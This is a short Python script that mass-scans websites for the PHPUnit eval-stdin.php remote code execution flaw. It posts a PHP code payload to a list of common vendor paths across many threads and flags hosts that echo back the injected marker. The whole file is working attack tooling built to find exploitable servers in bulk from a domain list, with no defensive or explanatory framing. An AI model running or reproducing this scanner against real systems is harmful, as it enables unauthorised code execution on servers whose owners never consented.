import argparse
import requests
from concurrent.futures import ThreadPoolExecutor

s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0'})
phpunitpath = ["/vendor/phpunit/phpunit/LICENSE/eval-stdin.php","/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php","/vendor/phpunit/src/Util/PHP/eval-stdin.php","/vendor/phpunit/Util/PHP/eval-stdin.php","/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","/vendor/nesbot/carbon/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"]


TESTING = '\033[92m'
SUCCESS = '\033[91m'

argparser = argparse.ArgumentParser()
argparser.add_argument('-d',"--domain",help="Check Single Domain",type=str)
argparser.add_argument('-i',"--inputfile",help="Read from file",type=str)
argparser.add_argument('-t',"--threads",help="Number of Threads(Default 20",type=int,default=20)
args=argparser.parse_args()


def phpunitexploiter(url):
	pathwithurl = []
	for path in phpunitpath:
		pathwithurl.append(url+path)

	def mainexploit(path):
		print(f" {TESTING} Trying {path}")
		response = s.get(path,data="<?php echo 'haxor'; ?>")
		if "haxor" in response.text:
			print(f"{SUCCESS}Found VULN {path}")
	
	with ThreadPoolExecutor(max_workers=20) as executor:
		executor.map(mainexploit,pathwithurl)





if args.domain:
    phpunitexploiter(args.domain)

urllist = []
if args.inputfile:
    urlfile = open(args.inputfile,"r")
    for url in urlfile.read().split('\n'):
        urllist.append(url)
        
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        executor.map(phpunitexploiter,urllist)




	
    

